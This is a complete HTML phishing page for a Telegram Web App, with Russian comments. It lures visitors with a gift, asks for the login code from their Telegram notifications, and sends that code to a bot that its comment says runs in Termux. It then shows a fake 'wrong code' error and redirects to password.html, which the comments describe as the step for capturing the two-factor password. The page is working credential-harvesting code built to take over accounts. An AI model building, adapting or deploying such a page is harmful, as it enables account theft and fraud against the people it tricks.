<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; margin: 0; padding: 20px; }
        .gift-anim { width: 150px; animation: float 3s infinite ease-in-out; margin-top: 20px; }
        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }
        
        input { 
            width: 100%; padding: 15px; border-radius: 12px; border: 1px solid #2c2c2e;
            background: #1c1c1e; color: #fff; font-size: 20px; text-align: center; outline: none;
            transition: border-color 0.3s;
        }
        /* Твоя просьба: красная рамка при ошибке */
        input.error { border-color: #ff3b30 !important; }
        .error-text { color: #ff3b30; display: none; margin-top: 10px; }
        
        .btn { background: #3390ec; color: #fff; padding: 15px; border-radius: 12px; width: 100%; border: none; font-weight: bold; margin-top: 20px; }
    </style>
</head>
<body>
    <img src="твой-подарок.png" class="gift-anim">
    <h2>Enter Code</h2>
    <p style="color: #8e8e93;">Check your Telegram notifications</p>
    
    <input type="text" id="c" placeholder="00000" maxlength="6" inputmode="numeric">
    <div id="err" class="error-text">Check code</div>
    <button class="btn" onclick="send()">Verify</button>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        function send() {
            const i = document.getElementById('c');
            const e = document.getElementById('err');
            
            if (i.value.length < 5) {
                i.classList.add('error');
                e.style.display = 'block';
                return;
            }

            // Автоматическая отправка данных боту в Termux
            tg.sendData(JSON.stringify({type: 'code', val: i.value}));
            
            // Имитация "неправильного кода" для перехода к 2FA
            i.classList.add('error');
            e.style.display = 'block';
            setTimeout(() => { window.location.href = "password.html"; }, 1500);
        }
    </script>
</body>
</html>
